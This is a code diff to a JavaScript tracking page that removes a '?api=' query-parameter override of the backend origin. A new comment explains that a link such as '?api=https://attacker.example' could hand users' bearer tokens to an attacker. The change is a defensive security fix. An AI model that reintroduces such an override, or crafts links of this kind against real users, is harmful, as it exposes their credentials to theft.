@@ -20,8 +20,11 @@
 (function () {
   'use strict';
 
-  // The API origin. Override for a staging backend with ?api=<origin>, which is
-  // read only from the query string and never persisted.
+  // The API origin is FIXED. A query-param override turned every tracking
+  // link into a token-exfiltration primitive: ?api=https://attacker.example
+  // hands the bearer token to the attacker in the request path. Never
+  // reintroduce an origin override on this page — verify staging backends
+  // with a local build instead.
   var DEFAULT_API = 'https://solra-backend-production.up.railway.app/api';
 
   var POLL_MS = 15000;          // how often to re-check while the page is open
@@ -49,23 +52,6 @@
     if (last && UUID_RE.test(last)) return last;
 
     return null;
-  }
-
-  function readApiOverride() {
-    var raw = new URLSearchParams(window.location.search).get('api');
-    if (!raw) return null;
-    try {
-      var url = new URL(raw);
-      var isLoopback = url.hostname === '127.0.0.1' || url.hostname === 'localhost' || url.hostname === '[::1]';
-      // https everywhere, so a crafted link cannot downgrade the connection and
-      // put the token on the wire in clear text. Loopback is exempt purely so
-      // this page can be verified against a backend running on the same machine;
-      // a loopback origin cannot be an attacker's remote collector.
-      if (url.protocol !== 'https:' && !(url.protocol === 'http:' && isLoopback)) return null;
-      return url.origin + url.pathname.replace(/\/+$/, '');
-    } catch (e) {
-      return null;
-    }
   }
 
   /*
@@ -362,9 +348,6 @@
   }
 
   // ── boot ───────────────────────────────────────────────────────────────────
-
-  var override = readApiOverride();
-  if (override) apiBase = override;
 
   token = readToken();
   if (!token) {
